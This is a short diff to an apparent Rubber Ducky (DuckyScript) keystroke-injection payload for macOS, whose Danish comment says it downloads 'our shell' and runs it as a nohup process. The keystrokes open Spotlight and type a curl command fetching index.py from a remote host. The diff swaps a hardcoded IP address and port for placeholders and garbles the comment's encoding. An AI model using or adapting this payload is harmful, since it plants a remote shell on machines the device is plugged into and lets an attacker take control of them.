@@ -1,4 +1,4 @@
-REM apple script der downloader vores shell og kører den som en nohup process
+REM apple script der downloader vores shell og kÃ¸rer den som en nohup process
 DELAY 300
 GUI SPACE
 DELAY 50
@@ -9,9 +9,9 @@ STRING curl /O http
 SHIFT .
 SHIFT 7
 SHIFT 7
-STRING 80.210.76.214
+STRING yourip
 SHIFT .
-STRING 900
+STRING your apache/nginx port
 SHIFT 7
 STRING index.py
 SPACE
